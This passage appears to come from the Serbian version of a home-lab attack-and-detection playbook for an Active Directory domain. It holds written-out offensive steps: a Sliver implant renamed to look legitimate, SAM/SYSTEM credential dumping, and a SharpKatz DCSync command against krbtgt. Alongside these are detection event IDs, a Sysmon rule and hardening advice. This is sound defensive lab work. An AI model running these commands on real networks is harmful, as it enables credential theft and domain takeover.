**[English](02_attack_playbook.md)** · **Srpski**
...
| 6 | Credential Dumping | reg save SAM/SYSTEM, secretsdump | T1003.002/.005/.006 | ✅ Lokalno radi, ❌ DCSync pao (AMSI + DRS bind) |
...
# Output: /tmp/INTENSIVE_WARLOCK.exe (Sliver dodeljuje random codename po buildu)
```

### Pripremi delivery (Kali, drugi terminal)

```bash
# 5.4 Preimenuj implant (SAVET preporuka — legitimno ime = masquerading)
...
**MITRE:** T1003.002 (SAM), T1003.005 (Cached Domain Credentials), T1003.006 (DCSync — pokušan, nije uspeo)
...
# 6.5 SharpKatz alternative (AMSI-evading, kompajlirani .NET)
C:\Temp\SharpKatz.exe --Command dcsync --User krbtgt --Domain MARVEL.LOCAL --DomainController 192.168.182.135
# Rezultat: "Error: 1825 - Error DC bind with default Guid" (RPC_S_SEC_PKG_ERROR)
# Razlog: Kerberos/auth greška na DRS bind-u (transport sloj), NE access-denied.
#         fcastle JE Domain Admin i IMA replikaciona prava (nested BUILTIN\Administrators).
```

### Zaključak za blue team narativ

**DCSync nikad nije uspeo — ali NE zbog permisija:**
1. Defender + AMSI blokirao Mimikatz PowerShell invokaciju (poznat alat, presečen pre izvršavanja)
2. SharpKatz (AMSI-evading) prošao AV, ali pao na DRS bind-u — RPC 1825, Kerberos/auth greška na transport sloju

**Zašto je ovo jača blue team priča od "nema privilegija":**
- AMSI zaustavlja **alat**, ne **tehniku** — to je kontrola koja je stvarno radila
- fcastle je Domain Admin (nested `BUILTIN\Administrators`) i **IMA** `DS-Replication-Get-Changes` / `-All` — privilegija nikad nije bila prepreka
- Kontrola koja bi stvarno detektovala DCSync je SACL auditing — EC4662 sa replication GUID-ovima (vidljivost, ne prevencija)
- Durable fix je **least privilege** — tiering admin naloga (Tier 0 izolacija) tako da kompromitovani endpoint-admin ne može da dosegne DA i zloupotrebi replikaciona prava, ne oslanjanje na AV potpise → Lab v2
...
- **Defender Operational log (EC1116/1117)** — blokade Mimikatz signature
- **Sysmon EC11** — File Create za sam.hive, system.hive, security.hive
- **EC4662** sa replication GUID-ovima — signature za DCSync (zahteva SACL auditing na DC-u)
...
Naivni fix bi bio dodati `GlobalProtect_Update.exe` na watchlist. To je anti-pattern —
napadač preimenuje binarni fajl i detekcija pada. Detektujemo **lokaciju + ponašanje**,
ne ime: svaki proces iz user-writable putanje koji pravi egress.

```xml
<NetworkConnect onmatch="include">
  <!-- bilo koji proces iz user-writable putanje koji ide na mrežu -->
...
Fidelity diže beacon-interval analiza (Sliver default 60s ± 30%), ne ime procesa.
Vendor-agnostic verzija je Sigma rule 7 u `detections/sigma/sigma_rules.yml`.
...
- DCSync attempt: AMSI blokira Mimikatz, SharpKatz pada na RPC 1825 (DRS bind, ne permisije)
- **Blue team win narativ** — AMSI zaustavio alat; least privilege je durable fix (ne "permisije su nas spasile")
...
Kompletni hardening playbook (napad → fix → re-run dokaz) je u `03_detection_playbook.md`. Sažetak 4 demoa:
...
**Closing insight (CENTRALNA POENTA):** Hardening ≠ Detection. Sva četiri napada su zaustavljena ili detektovana, ali nijedan kontrol nije bulletproof. Spray može da postane low-and-slow. AppLocker se bypass-uje kroz signed LOLBin. Sysmon watchlist propušta sve van C:\Temp. Detection je safety net za sve što prođe prevention layer.
